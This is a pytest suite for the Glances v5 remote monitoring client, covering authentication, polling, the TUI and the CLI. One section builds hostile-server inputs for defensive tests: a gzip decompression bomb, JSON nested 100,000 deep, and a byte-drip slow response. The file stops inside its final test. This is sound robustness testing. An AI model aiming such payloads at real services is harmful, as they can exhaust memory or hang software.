#
# Glances - An eye on your system
#
# SPDX-FileCopyrightText: 2026 Nicolas Hennion <nicolas@nicolargo.com>
#
# SPDX-License-Identifier: LGPL-3.0-only
#

"""Glances v5 — the remote client, core (Phase 3, P3-1).

The transport is tested against a fake `requests` session; the whole path
(RemoteSource -> store -> TUI header) against a real v5 app in the last
section. Design: docs/superpowers/specs/2026-09-27-glances-v5-phase3-design.md.
"""

from __future__ import annotations

import asyncio
import io
import json
import logging
import time
import zlib
from typing import Any

import pytest
import requests
import urllib3

from glances import client
from glances.client import (
    AuthError,
    NotAGlancesServer,
    RemoteAlerts,
    RemoteConnection,
    RemoteError,
    RemoteSource,
    parse_target,
)
from glances.stats_store import StatsStore

# ------------------------------------------------------------ addresses


@pytest.mark.parametrize(
    ("target", "base", "host"),
    [
        ("myhost", "http://myhost:61208", "myhost"),
        ("myhost:1234", "http://myhost:1234", "myhost"),
        ("https://proxy.example/glances/", "https://proxy.example:61208/glances", "proxy.example"),
        ("http://[::1]:9000", "http://[::1]:9000", "::1"),
    ],
)
def test_parse_target(target, base, host):
    assert parse_target(target) == (base, host)


def test_parse_target_rejects_other_schemes():
    with pytest.raises(ValueError):
        parse_target("ftp://host")


# ------------------------------------------------------ a fake server


class _Raw:
    """`response.raw`: what the client reads, chunk by chunk."""

    def __init__(self, data: bytes) -> None:
        self._buffer = io.BytesIO(data)

    def read(self, amt: int | None = None, decode_content: bool | None = None) -> bytes:
        return self._buffer.read(amt)


class _Response:
    """`body`: a JSON value, raw bytes as sent, or `ValueError` for a body that is not JSON."""

    def __init__(self, status: int, body: Any = None) -> None:
        self.status_code = status
        self.ok = 200 <= status < 300
        if body is ValueError:
            body = b"<html>not JSON</html>"
        self.raw = _Raw(body if isinstance(body, bytes) else json.dumps(body).encode())
        self.closed = False

    def close(self) -> None:
        self.closed = True


class _FakeSession:
    """Answers like a v5 server; records what the client sent."""

    def __init__(self, password: str | None = None, token_status: int | None = None) -> None:
        self.verify = True
        self.password = password
        self.token_status = token_status
        self.requests: list[tuple[str, str, Any]] = []
        self.routes: dict[str, Any] = {
            "/status": {"status": "ok", "version": "5"},
            "/api/5/all/info": {
                "system": {"hostname": {"unit": "string"}},
                "cpu": {"total": {"unit": "percent"}},
                "network": {"interface_name": {"unit": "string", "primary_key": True}},
                "version": {"version": {"unit": "string"}},
            },
            "/api/5/all": {"system": {"hostname": "srv"}, "cpu": {"total": 12.5, "_levels": {}}},
        }
        self.down = False
        self.expired = False
        self.refuse_sort = False
        self.token_body: Any = {"access_token": "tok", "token_type": "bearer"}

    def post(self, url, auth=None, headers=None, timeout=None, stream=False):
        self.requests.append(("POST", url, auth))
        if "/processes/sort/" in url:
            # The shared sort route; `refuse_sort` plays an older v5 server.
            return _Response(404, {}) if self.refuse_sort else _Response(200, True)
        if "/processes/extended/" in url:
            # The pin routes: 404 for a pid the server does not list, as it does.
            target = url.rsplit("/", 1)[1]
            return _Response(200, True) if target in ("disable", "1000", "1001") else _Response(404, {})
        if self.token_status:
            return _Response(self.token_status)
        if self.password is None:
            return _Response(404)
        if auth and auth[1] == self.password:
            self.expired = False
            return _Response(200, self.token_body)
        return _Response(401)

    def get(self, url, headers=None, timeout=None, stream=False):
        self.requests.append(("GET", url, headers))
        if self.down:
            raise requests.ConnectionError("connection refused")
        if self.password is not None and (headers or {}).get("Authorization") != "Bearer tok" or self.expired:
            return _Response(401)
        path = url.split("61208", 1)[1]
        if path not in self.routes:
            return _Response(404)
        body = self.routes[path]
        return body if isinstance(body, _Response) else _Response(200, body)


def _connection(session: _FakeSession, password: str | None = None) -> RemoteConnection:
    conn = RemoteConnection("http://srv:61208", password=password)
    conn._session = session
    return conn


# --------------------------------------------------------------- transport


def test_no_password_no_token_request():
    session = _FakeSession()
    assert _connection(session).get_json("/status")["version"] == "5"
    assert [r[0] for r in session.requests] == ["GET"]


def test_a_password_is_traded_for_one_token():
    """PBKDF2 once, then an HMAC-checked bearer on every poll (§4.3)."""
    session = _FakeSession(password="s3cret")
    conn = _connection(session, "s3cret")
    for _ in range(3):
        conn.get_json("/api/5/all")
    posts = [r for r in session.requests if r[0] == "POST"]
    assert len(posts) == 1
    assert all(r[2] == {"Authorization": "Bearer tok"} for r in session.requests if r[0] == "GET")


def test_the_password_never_goes_into_a_url():
    session = _FakeSession(password="s3cret")
    _connection(session, "s3cret").get_json("/api/5/all")
    assert all("s3cret" not in url for _m, url, _x in session.requests)


def test_a_server_without_auth_is_read_without_a_token():
    """`/api/5/token` answers 404 when auth is not configured: go on without."""
    session = _FakeSession(token_status=404)
    session.password = None
    conn = _connection(session, "unused")
    assert conn.get_json("/status")["version"] == "5"


def test_a_wrong_password_is_an_auth_error():
    with pytest.raises(AuthError, match="refused"):
        _connection(_FakeSession(password="right"), "wrong").get_json("/status")


def test_a_missing_password_is_an_auth_error_that_says_how_to_fix_it():
    with pytest.raises(AuthError, match="--password"):
        _connection(_FakeSession(password="right")).get_json("/status")


def test_an_expired_token_is_renewed_once():
    session = _FakeSession(password="s3cret")
    conn = _connection(session, "s3cret")
    conn.get_json("/status")
    session.expired = True
    assert conn.get_json("/status")["version"] == "5"
    assert len([r for r in session.requests if r[0] == "POST"]) == 2


def test_a_network_failure_is_a_remote_error():
    session = _FakeSession()
    session.down = True
    with pytest.raises(RemoteError, match="refused"):
        _connection(session).get_json("/status")


# ------------------------------------------- a hostile server (audit B-17)


def test_a_body_that_is_not_json_is_not_a_glances_server():
    session = _FakeSession()
    session.routes["/status"] = ValueError
    with pytest.raises(NotAGlancesServer, match="did not answer as a Glances server"):
        _connection(session).get_json("/status")


def test_json_too_deep_for_the_decoder_is_not_a_glances_server():
    """`[[[[...` 100 000 deep: json's RecursionError escaped `response.json()`."""
    session = _FakeSession()
    session.routes["/status"] = b"[" * 100_000 + b"]" * 100_000
    with pytest.raises(NotAGlancesServer, match="RecursionError"):
        _connection(session).get_json("/status")


@pytest.mark.parametrize("token_body", [["tok"], {"access_token": 5}, {"access_token": ""}, "tok", None])
def test_a_token_answer_that_is_not_a_token_is_not_a_glances_server(token_body):
    """`response.json().get(...)` on a list was an AttributeError out of the client."""
    session = _FakeSession(password="pw")
    session.token_body = token_body
    with pytest.raises(NotAGlancesServer, match="did not answer a token"):
        _connection(session, password="pw").get_json("/status")


def test_a_body_is_cut_at_32_mib_before_it_is_inflated():
    """100 KiB of gzip became 200 MiB in memory (proven by the audit): the body
    is read through urllib3's decoder in chunks and dropped past the cap."""
    compressor = zlib.compressobj(9, zlib.DEFLATED, 31)  # 31: gzip container
    block = bytes(1 << 20)
    gz = b"".join(compressor.compress(block) for _ in range(200)) + compressor.flush()
    assert len(gz) < 300 * 1024, "a real bomb: 200 MiB in less than 300 KiB"
    raw = urllib3.response.HTTPResponse(
        body=io.BytesIO(gz), headers={"content-encoding": "gzip"}, preload_content=False
    )
    response = _Response(200)
    response.raw = raw
    session = _FakeSession()
    session.routes["/status"] = response
    with pytest.raises(NotAGlancesServer, match="more than 32 MiB"):
        _connection(session).get_json("/status")
    assert raw.tell() < len(gz) // 2, "stopped reading long before the end of the stream"
    assert response.closed


def test_a_body_dripped_byte_by_byte_hits_the_deadline():
    """`timeout` bounds each read: a byte every few ms never tripped it."""

    class _Drip:
        def read(self, amt=None, decode_content=None):
            time.sleep(0.002)
            return b"1"

    response = _Response(200)
    response.raw = _Drip()
    session = _FakeSession()
    session.routes["/status"] = response
    conn = RemoteConnection("http://srv:61208", timeout=0.01)
    conn._session = session
    started = time.monotonic()
    with pytest.raises(RemoteError, match="did not finish answering"):
        conn.get_json("/status")
    assert time.monotonic() - started < 2
    assert response.closed


def test_a_poll_survives_a_payload_shaped_to_break_it(caplog):
    """`top: 5` in an incident: `list(5)` is a TypeError, outside RemoteError,
    and it stopped the client's polling loop for good."""
    session = _FakeSession()
    session.routes["/api/5/alert"] = []
    session.routes["/api/5/alert/incidents"] = {"incidents": [{"ongoing": True, "top": 5}]}
    source = _source(session)
    with caplog.at_level(logging.WARNING, logger="glances.client"):
        asyncio.run(source.poll_once())
        asyncio.run(source.poll_once())
    assert source.status()[0] == "disconnected"
    assert caplog.text.count("unexpected answer (TypeError") == 1


def test_plain_http_with_credentials_to_a_remote_host_warns(caplog):
    with caplog.at_level(logging.WARNING, logger="glances.client"):
        RemoteConnection("http://10.0.0.5:61208", password="x")
        RemoteConnection("http://localhost:61208", password="x")
        RemoteConnection("https://10.0.0.5:61208", password="x")
    assert caplog.text.count("plain HTTP") == 1


# ------------------------------------------------------------------ source


def _source(session: _FakeSession, **kw) -> RemoteSource:
    return RemoteSource(_connection(session), StatsStore(), "srv", **kw)


def test_connect_loads_the_servers_schema_into_the_tui_registry():
    source = _source(_FakeSession(), hidden_plugins={"version"})
    registry = source.registry  # the object the TUI holds
    source.connect()
    assert source.registry is registry
    assert registry == [("system", False), ("cpu", False), ("network", True)]
    assert source.fields_by_plugin["network"]["interface_name"]["primary_key"] is True
    assert source.status() == ("connected", "srv", None)


def test_before_any_connection_the_registry_holds_system_alone():
    """So the header can say "Disconnected from <host>" with no payload."""
    source = _source(_FakeSession())
    assert source.registry == [("system", False)]
    assert source.status() == ("disconnected", "srv", None)


def test_a_non_api_5_server_is_refused():
    session = _FakeSession()
    session.routes["/status"] = {"status": "ok", "version": "4"}
    with pytest.raises(NotAGlancesServer, match="not a Glances v5 server"):
        _source(session).connect()


def test_a_poll_publishes_every_payload_as_served():
    source = _source(_FakeSession())
    asyncio.run(source.poll_once())
    assert source.store.get("cpu") == {"total": 12.5, "_levels": {}}
    assert source.store.get("system") == {"hostname": "srv"}


def test_failed_polls_keep_the_last_data_and_its_time():
    """Disconnected, the TUI shows the last values received, never cleared
    (maintainer, 2026-09-27), and when they were received."""
    session = _FakeSession()
    source = _source(session)
    assert source.status()[2] is None, "nothing received yet"
    asyncio.run(source.poll_once())
    received = source.status()[2]
    assert received is not None
    session.down = True
    for _ in range(10):
        asyncio.run(source.poll_once())
    assert source.status() == ("disconnected", "srv", received)
    assert source.store.get("cpu") == {"total": 12.5, "_levels": {}}


def test_the_same_answer_twice_is_not_a_failure():
    """A server slower than the client serves the same data again: still connected
    (maintainer, 2026-09-27)."""
    source = _source(_FakeSession())
    for _ in range(4):
        asyncio.run(source.poll_once())
    assert source.status()[0] == "connected"


def test_a_failure_is_logged_once_not_every_cycle(caplog):
    session = _FakeSession()
    session.down = True
    source = _source(session)
    with caplog.at_level(logging.WARNING, logger="glances.client"):
        for _ in range(5):
            asyncio.run(source.poll_once())
    assert caplog.text.count("Cannot read") == 1


def test_it_reconnects_when_the_server_comes_back():
    session = _FakeSession()
    session.down = True
    source = _source(session)
    asyncio.run(source.poll_once())
    session.down = False
    asyncio.run(source.poll_once())
    assert source.status()[0] == "connected"
    assert source.store.get("cpu")["total"] == 12.5


# ------------------------------------------------------------- the header


def test_the_system_header_shows_the_client_status():
    from glances.outputs.curses_renderer import ColorRole
    from glances.plugins.system.render_curses import render

    rows = render({"hostname": "srv", "hr_name": "Linux"}, {}, view={"client_status": "connected"})
    assert [(c.text, c.color) for c in rows[0].cells][:2] == [("Connected to", ColorRole.OK), ("srv", ColorRole.HEADER)]
    rows = render({}, {}, view={"client_status": "disconnected", "client_host": "srv"})
    assert [(c.text, c.color) for c in rows[0].cells] == [
        ("Disconnected from", ColorRole.CRITICAL),
        ("srv", ColorRole.HEADER),
    ]
    assert render({}, {}) == [], "standalone, no payload: nothing, as before"


def test_the_disconnected_header_says_when_the_values_are_from():
    import time

    from glances.outputs.curses_renderer import ColorRole
    from glances.plugins.system.render_curses import render

    received = time.mktime((2026, 9, 27, 14, 2, 31, 0, 0, -1))
    view = {"client_status": "disconnected", "client_host": "srv", "client_last_update": received}
    cells = [(c.text, c.color) for c in render({"hostname": "srv", "hr_name": "Linux"}, {}, view=view)[0].cells]
    assert cells[:3] == [
        ("Disconnected from", ColorRole.CRITICAL),
        ("srv", ColorRole.HEADER),
        ("(last update 14:02:31)", ColorRole.CRITICAL),
    ]
    view["client_status"] = "connected"
    assert "(last update 14:02:31)" not in [c.text for c in render({"hostname": "srv"}, {}, view=view)[0].cells]


# --------------------------------------------------------------------- CLI


def test_client_flags_parse():
    from glances.main import build_parser

    args = build_parser().parse_args(["-c", "srv:61208", "-u", "admin", "--password"])
    assert (args.client, args.username, args.password_prompt) == ("srv:61208", "admin", True)


@pytest.mark.parametrize("extra", [["-s"], ["--stdout", "cpu"], ["--fetch"], ["--issue"]])
def test_client_runs_on_its_own(extra):
    from glances.main import build_parser, validate_args

    with pytest.raises(SystemExit):
        validate_args(build_parser().parse_args(["-c", "srv", *extra]))


def test_client_accepts_export():
    """Issue #1527: the client exports the server's stats (P3-2)."""
    from glances.main import build_parser, validate_args

    validate_args(build_parser().parse_args(["-c", "srv", "--export", "csv"]))


@pytest.mark.parametrize("flags", [["-u", "admin"], ["--password"]])
def test_credentials_need_client(flags):
    from glances.main import build_parser, validate_args

    with pytest.raises(SystemExit):
        validate_args(build_parser().parse_args(flags))


def test_a_wrong_password_is_fatal_before_the_tui(monkeypatch, capsys, tmp_path):
    """A clear message and exit 2, not a TUI saying "Disconnected"."""
    from glances import client, main
    from glances.config import GlancesConfig

    monkeypatch.setattr(GlancesConfig, "SYSTEM_CONFIG_PATH", tmp_path / "none.conf")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))

    def refuse(self):
        raise client.AuthError("http://srv:61208 refused the username or password")

    monkeypatch.setattr(client.RemoteSource, "connect", refuse)
    args = main.build_parser().parse_args(["-c", "srv"])
    assert main.run_client(args, GlancesConfig()) == 2
    assert "refused the username or password" in capsys.readouterr().err


# ------------------------------------------------------ alerts (P3-2)


def _server_incidents(history, ongoing, since, top):
    """What `/api/5/alert/incidents` serves for this engine state (routes)."""
    from glances.alerts_incidents import derive_incidents, incident_duration

    incidents = derive_incidents(history, ongoing=ongoing, ongoing_since=since, ongoing_top=top)
    for incident in incidents:
        incident["duration"] = incident_duration(incident)
    return {"is_initializing": False, "incidents": incidents}


def test_the_mirrored_alerts_derive_the_servers_incidents():
    """The TUI derives its block from the adapter: it must find the server's own incidents,
    including the cases the engine's maps exist for (an evicted opening, a live top)."""
    from glances.alerts_incidents import derive_incidents

    history = [
        # resolved
        {
            "plugin": "mem",
            "key": None,
            "field": "percent",
            "level": "warning",
            "previous_level": "ok",
            "ts": "2026-09-27T10:00:00+00:00",
            "top": ["a"],
        },
        {
            "plugin": "mem",
            "key": None,
            "field": "percent",
            "level": "ok",
            "previous_level": "warning",
            "ts": "2026-09-27T10:05:00+00:00",
        },
        # ongoing, its opening evicted: only an escalation survives
        {
            "plugin": "fs",
            "key": "/",
            "field": "percent",
            "level": "critical",
            "previous_level": "warning",
            "ts": "2026-09-27T10:10:00+00:00",
        },
        # ongoing, opening kept
        {
            "plugin": "load",
            "key": None,
            "field": "min5",
            "level": "careful",
            "previous_level": "ok",
            "ts": "2026-09-27T10:20:00+00:00",
            "top": ["x"],
        },
    ]
    ongoing = {("fs", "/", "percent"): "critical", ("load", None, "min5"): "warning", ("cpu", None, "total"): "careful"}
    since = {("load", None, "min5"): "2026-09-27T10:20:00+00:00"}
    top = {("load", None, "min5"): {"top": ["x", "y"], "top_sort": "cpu_percent"}}
    served = _server_incidents(history, ongoing, since, top)

    alerts = RemoteAlerts()
    alerts.update(history, served)
    mirrored = derive_incidents(
        alerts.get_history(),
        ongoing=alerts.get_ongoing(),
        ongoing_since=alerts.get_ongoing_since(),
        ongoing_top=alerts.get_ongoing_top(),
    )
    assert mirrored == [{k: v for k, v in i.items() if k != "duration"} for i in served["incidents"]]
    assert not alerts.is_initializing()


def test_a_poll_mirrors_the_servers_alerts():
    session = _FakeSession()
    history = [
        {
            "plugin": "mem",
            "key": None,
            "field": "percent",
            "level": "warning",
            "previous_level": "ok",
            "ts": "2026-09-27T10:00:00+00:00",
        }
    ]
    session.routes["/api/5/alert"] = history
    session.routes["/api/5/alert/incidents"] = _server_incidents(
        history, {("mem", None, "percent"): "warning"}, {}, {}
    ) | {"is_initializing": True}
    source = _source(session)
    asyncio.run(source.poll_once())
    assert source.alerts.get_history() == history
    assert source.alerts.get_ongoing() == {("mem", None, "percent"): "warning"}
    assert source.alerts.is_initializing()


def test_a_server_without_alerts_is_still_connected():
    """Alerts disabled on the server: 404 on its alert routes. An empty block, not a failure."""
    source = _source(_FakeSession())
    asyncio.run(source.poll_once())
    assert source.status()[0] == "connected"
    assert source.alerts.get_history() == [] and source.alerts.get_ongoing() == {}


# ------------------------------------------------------ exports (P3-2)


def _config(**sections):
    from unittest.mock import MagicMock

    config = MagicMock()
    config.get.side_effect = lambda section, key, default=None: sections.get(section, {}).get(key, default)
    config.section_keys.return_value = []
    return config


_SCHEMA = {
    "mem": {"percent": {"unit": "percent"}, "total": {"unit": "bytes"}, "secret": {"exportable": False}},
    "network": {"interface_name": {"primary_key": True}, "bytes_recv": {"unit": "bytes"}},
    "processlist": {"pid": {"primary_key": True}, "name": {}, "cmdline": {}},
    "version": {"version": {}},
}


def _remote_store():
    store = StatsStore()
    asyncio.run(store.set("mem", {"percent": 42.0, "total": 16, "_levels": {"percent": {"level": "ok"}}}))
    asyncio.run(
        store.set("network", {"data": [{"interface_name": "eth0", "bytes_recv": 10}], "_key": "interface_name"})
    )
    procs = [{"pid": 1, "name": "nginx", "cmdline": ["nginx"]}, {"pid": 2, "name": "python3", "cmdline": ["python3"]}]
    asyncio.run(store.set("processlist", {"data": procs}))
    return store


def test_remote_plugins_export_what_the_server_published():
    plugins = {p.plugin_name: p for p in client.remote_plugins(_SCHEMA, _remote_store(), _config(), {"version"})}
    assert set(plugins) == {"mem", "network", "processlist"}, "a plugin not exportable locally is not either here"
    assert plugins["mem"].get_export() == {"percent": 42.0, "total": 16}, "no `_levels`"
    assert plugins["network"].IS_COLLECTION and plugins["network"]._primary_key == "interface_name"
    assert plugins["network"].get_export() == [{"interface_name": "eth0", "bytes_recv": 10}]
    assert plugins["processlist"].get_export() == [], "no process exported by default (v4 #794)"


def test_remote_processlist_export_follows_the_export_filter():
    config = _config(processlist={"export": "python.*"})
    plugins = {p.plugin_name: p for p in client.remote_plugins(_SCHEMA, _remote_store(), config, set())}
    assert [p["pid"] for p in plugins["processlist"].get_export()] == [2]


def test_client_exports_only_while_connected_and_exits_the_exporters():
    from glances.main import _client_exports

    class _Exporter:
        export_name = "fake"

        def __init__(self):
            self.ticks, self.exited = [], False

        def update(self, plugins):
            self.ticks.append([p.plugin_name for p in plugins])

        def exit(self):
            self.exited = True

    class _Source:
        connected = False

    source, exporter, store = _Source(), _Exporter(), _remote_store()
    built = []

    def build():
        built.append(1)
        return client.remote_plugins(_SCHEMA, store, _config(), set())

    async def scenario():
        task = asyncio.create_task(_client_exports(source, [exporter], build, 0.01))
        await asyncio.sleep(0.05)
        assert exporter.ticks == [], "disconnected: the last values are shown, not exported again"
        source.connected = True
        await asyncio.sleep(0.05)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task

    asyncio.run(scenario())
    assert exporter.ticks and "mem" in exporter.ticks[0]
    assert len(built) == 1, "the plugins are built once, from the schema"
    assert exporter.exited


# ------------------------------------------------ process keys (P3-2)


def test_pin_extended_posts_to_the_servers_pin_routes():
    session = _FakeSession()
    source = _source(session)
    source.pin_extended(1000)
    source.pin_extended(None)
    assert [r[1] for r in session.requests if r[0] == "POST"] == [
        "http://srv:61208/api/5/processes/extended/1000",
        "http://srv:61208/api/5/processes/extended/disable",
    ]
    with pytest.raises(RemoteError, match="404"):
        source.pin_extended(4242)


def test_leaving_the_client_drops_its_pin_on_the_server(caplog):
    session = _FakeSession()
    source = _source(session)
    source.unpin_on_exit()
    assert not [r for r in session.requests if r[0] == "POST"], "nothing pinned: nothing sent"
    source.pin_extended(1000)
    source.unpin_on_exit()
    assert session.requests[-1][1].endswith("/api/5/processes/extended/disable")
    assert source.pinned is None
    source.pin_extended(1001)

    def refused(*args, **kwargs):
        raise requests.ConnectionError("refused")

    session.post = refused
    with caplog.at_level(logging.WARNING, logger="glances.client"):
        source.unpin_on_exit()  # the server is gone: a warning, not a crash
    assert "Cannot unpin pid 1001" in caplog.text


def _client_tui(monkeypatch, source):
    from unittest.mock import MagicMock

    from glances.outputs import glances_curses as tui_mod

    engine = tui_mod.glances_processes
    for attr, value in (("extended_pid", None), ("extended_process", None), ("disable_extended_tag", True)):
        monkeypatch.setattr(engine, attr, value, raising=False)
    monkeypatch.setattr(engine, "process_filter", None)
    config = MagicMock()
    config.get.side_effect = lambda section, key, default=None: default
    tui = tui_mod.Tui(store=source.store, alerts=None, config=config, registry=[], fields_by_plugin={}, remote=source)
    tui._cursor_items = [{"pid": 1000, "name": "nginx"}, {"pid": 1001, "name": "python"}]
    tui._cursor_max = 2
    popups: list[str] = []
    monkeypatch.setattr(tui, "_popup_info", lambda stdscr, message: popups.append(message))
    monkeypatch.setattr(tui, "_popup_yesno", lambda stdscr, message: pytest.fail("no confirmation expected"))
    return tui, popups


@pytest.mark.parametrize("key", ["k", "+", "-"])
def test_client_mode_refuses_the_keys_that_would_act_on_this_machine(monkeypatch, key):
    """v4 #3221: `k`, `+`, `-` would hit the CLIENT's pids. Refused, and said."""
    from glances.outputs import glances_curses as tui_mod

    for action in ("kill", "nice_increase", "nice_decrease"):
        monkeypatch.setattr(tui_mod.glances_processes, action, lambda pid: pytest.fail("acted locally"))
    tui, popups = _client_tui(monkeypatch, _source(_FakeSession()))
    assert tui._handle_key(ord(key)) == "modal"
    tui._run_pending(None)
    assert popups and "client mode" in popups[0]


def test_client_mode_enter_pins_on_the_server_and_shows_its_extended_stats(monkeypatch):
    session = _FakeSession()
    source = _source(session)
    tui, popups = _client_tui(monkeypatch, source)
    assert tui._handle_key(10) == "modal"
    tui._run_pending(None)
    assert popups == []
    assert ("POST", "http://srv:61208/api/5/processes/extended/1000", None) in session.requests
    assert tui._view.extended
    assert tui._extended_payload() is None, "until the server publishes it"
    extended = {"pid": 1000, "name": "nginx", "extended_stats": True}
    asyncio.run(source.store.set("processlist", {"data": [], "extended": extended}))
    assert tui._extended_payload() == extended
    # ENTER again unpins, on the server.
    tui._handle_key(10)
    tui._run_pending(None)
    assert ("POST", "http://srv:61208/api/5/processes/extended/disable", None) in session.requests
    assert not tui._view.extended


def test_client_mode_enter_reports_a_refusal_from_the_server(monkeypatch):
    tui, popups = _client_tui(monkeypatch, _source(_FakeSession()))
    tui._cursor_items = [{"pid": 4242, "name": "gone"}]
    tui._handle_key(10)
    tui._run_pending(None)
    assert popups and "refused" in popups[0]
    assert not tui._view.extended


def test_client_mode_filters_the_received_list_locally(monkeypatch):
    """The server's engine filter is global to every client: untouched (§4.1)."""
    tui, _ = _client_tui(monkeypatch, _source(_FakeSession()))
    tui._set_filter(".*python.*")
    snapshot = {
        "processlist": {
            "data": [
                {"pid": 1, "name": "nginx", "cmdline": ["nginx"]},
                {"pid": 2, "name": "python3", "cmdline": ["python3"]},
            ]
        },
    }
    tui._apply_client_filter(snapshot)
    assert [p["pid"] for p in snapshot["processlist"]["data"]] == [2]
    tui._set_filter(None)
    snapshot = {"processlist": {"data": [{"pid": 1, "name": "nginx"}]}}
    tui._apply_client_filter(snapshot)
    assert len(snapshot["processlist"]["data"]) == 1


# ------------------------------------------- shared sort (2026-09-30)


@pytest.fixture
def sort_state(monkeypatch):
    from glances.outputs import glances_curses as tui_mod

    engine = tui_mod.glances_processes
    monkeypatch.setattr(engine, "_sort_key", "cpu_percent", raising=False)
    monkeypatch.setattr(engine, "auto_sort", True, raising=False)
    return engine


def _sort_posts(session):
    return [r[1].rsplit("/", 1)[1] for r in session.requests if r[0] == "POST" and "/processes/sort/" in r[1]]


def test_set_sort_posts_to_the_servers_sort_route():
    session = _FakeSession()
    _source(session).set_sort("memory_percent")
    assert ("POST", "http://srv:61208/api/5/processes/sort/memory_percent", None) in session.requests


def test_client_mode_a_sort_key_sorts_here_and_on_the_server(monkeypatch, sort_state):
    session = _FakeSession()
    tui, popups = _client_tui(monkeypatch, _source(session))
    assert tui._handle_key(ord("m")) == "changed"
    assert sort_state.sort_key == "memory_percent" and sort_state.auto_sort is False
    tui._handle_key(ord("a"))
    assert sort_state.auto_sort is True
    assert _sort_posts(session) == ["memory_percent", "auto"]
    assert popups == []


def test_client_mode_the_arrows_sort_on_the_server_too(monkeypatch, sort_state):
    session = _FakeSession()
    tui, _ = _client_tui(monkeypatch, _source(session))
    tui._step_sort(1)
    assert _sort_posts(session) == [sort_state.sort_key]


def test_client_mode_a_refused_sort_still_sorts_here(monkeypatch, sort_state, caplog):
    """An older v5 server has no sort route: the key keeps its local effect."""
    session = _FakeSession()
    session.refuse_sort = True
    tui, popups = _client_tui(monkeypatch, _source(session))
    with caplog.at_level(logging.INFO, logger="glances.outputs.glances_curses"):
        tui._handle_key(ord("p"))
    assert sort_state.sort_key == "name"
    assert popups == []
    assert "did not take the sort" in caplog.text


def test_client_mode_follows_a_sort_set_by_another_viewer(monkeypatch, sort_state):
    source = _source(_FakeSession())
    tui, _ = _client_tui(monkeypatch, source)
    asyncio.run(source.store.set("processcount", {"total": 1, "sort_key": "username", "auto_sort": False}))
    tui._follow_server_sort()
    assert sort_state.sort_key == "username" and sort_state.auto_sort is False
    asyncio.run(source.store.set("processcount", {"total": 1, "sort_key": "cpu_percent", "auto_sort": True}))
    tui._follow_server_sort()
    assert sort_state.sort_key == "cpu_percent" and sort_state.auto_sort is True


def test_client_mode_a_stale_snapshot_does_not_revert_a_key_just_pressed(monkeypatch, sort_state):
    """The server published (cpu_percent, auto) before this client's POST
    landed: the snapshot still says so, and must not undo the `m`."""
    source = _source(_FakeSession())
    tui, _ = _client_tui(monkeypatch, source)
    asyncio.run(source.store.set("processcount", {"total": 1, "sort_key": "cpu_percent", "auto_sort": True}))
    tui._follow_server_sort()
    tui._handle_key(ord("m"))
    tui._follow_server_sort()  # same (stale) server pair
    assert sort_state.sort_key == "memory_percent"
    asyncio.run(source.store.set("processcount", {"total": 1, "sort_key": "memory_percent", "auto_sort": False}))
    tui._follow_server_sort()
    assert sort_state.sort_key == "memory_percent"


def test_client_mode_an_older_server_leaves_the_sort_local(monkeypatch, sort_state):
    source = _source(_FakeSession())
    tui, _ = _client_tui(monkeypatch, source)
    tui._handle_key(ord("t"))
    asyncio.run(source.store.set("processcount", {"total": 1}))
    tui._follow_server_sort()
    assert sort_state.sort_key == "cpu_times"


# ------------------------------------------------- against a real v5 app


class _TestClientSession:
    """A TestClient behind `requests.Session`'s surface: `timeout=` dropped, `.ok` added."""

    def __init__(self, http: Any) -> None:
        self._http = http

    def _wrap(self, response: Any) -> _Response:
        try:
            body = response.json()
        except ValueError:
            body = ValueError
        return _Response(response.status_code, body)

    def get(self, url: str, headers: dict | None = None, timeout: float | None = None, stream: bool = False):
        return self._wrap(self._http.get(url, headers=headers))

    def post(self, url: str, auth: Any = None, headers: dict | None = None, timeout=None, stream: bool = False):
        return self._wrap(self._http.post(url, auth=auth, headers=headers))


def test_against_a_real_app(tmp_path, monkeypatch):
    """The source reads what a real `build_app` serves, through `requests`' API."""
    from fastapi.testclient import TestClient

    from glances.config import GlancesConfig
    from glances.plugins.mem.model import PluginModel as Mem
    from glances.webserver import build_app, register_plugin

    monkeypatch.setattr(GlancesConfig, "SYSTEM_CONFIG_PATH", tmp_path / "none.conf")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
    config = GlancesConfig()
    server_store = StatsStore()
    mem = Mem(server_store, config)
    asyncio.run(mem.update())
    app = build_app(config=config, store=server_store)
    register_plugin(app, mem)

    with TestClient(app, base_url="http://localhost:61208") as http:
        conn = RemoteConnection("http://localhost:61208")
        conn._session = _TestClientSession(http)
        source = RemoteSource(conn, StatsStore(), "srv")
        source.connect()
        asyncio.run(source.poll_once())
    assert ("mem", False) in source.registry
    assert source.store.get("mem")["percent"] == server_store.get("mem")["percent"]
    assert "_levels" in source.store.get("mem"), "the server's levels colour the client"


def test_run_client_reads_passwords_from_a_real_config(tmp_path, monkeypatch):
    """P3-1 regression: `[passwords] <host>` set in the file made `config.get(..., None)` raise."""
    from glances import main
    from glances.config import GlancesConfig

    monkeypatch.setattr(GlancesConfig, "SYSTEM_CONFIG_PATH", tmp_path / "none.conf")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
    conf = tmp_path / "glances.conf"
    conf.write_text("[passwords]\nsrv=pw\n")
    seen = []
    monkeypatch.setattr(main, "open_client", lambda args, config, target, user, password: seen.append(password))
    args = main.build_parser().parse_args(["-c", "srv"])
    assert main.run_client(args, GlancesConfig(str(conf))) == 0
    assert seen == ["pw"]


# ------------------------------------------------ -c honours --port


def test_parse_target_takes_the_default_port_it_is_given():
    assert parse_target("myhost", 9000) == ("http://myhost:9000", "myhost")
    # A port written in the target wins: it is the more specific of the two.
    assert parse_target("myhost:1234", 9000) == ("http://myhost:1234", "myhost")
    assert parse_target("http://[::1]", 9000) == ("http://[::1]:9000", "::1")


@pytest.mark.parametrize(
    ("argv", "expected"),
    [
        (["-c", "srv", "--port", "61299"], "http://srv:61299"),
        (["-c", "srv", "-p", "61299"], "http://srv:61299"),
        (["-c", "srv:1234", "--port", "61299"], "http://srv:1234"),
        (["-c", "srv"], "http://srv:61208"),
    ],
)
def test_run_client_connects_to_the_port_given_with_port(tmp_path, monkeypatch, argv, expected):
    """`-c host --port N` used to ignore N and connect to 61208."""
    from glances import main
    from glances.config import GlancesConfig

    monkeypatch.setattr(GlancesConfig, "SYSTEM_CONFIG_PATH", tmp_path / "none.conf")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
    seen = []
    monkeypatch.setattr(
        main, "open_client", lambda args, config, target, user, password: seen.append(parse_target(target)[0])
    )
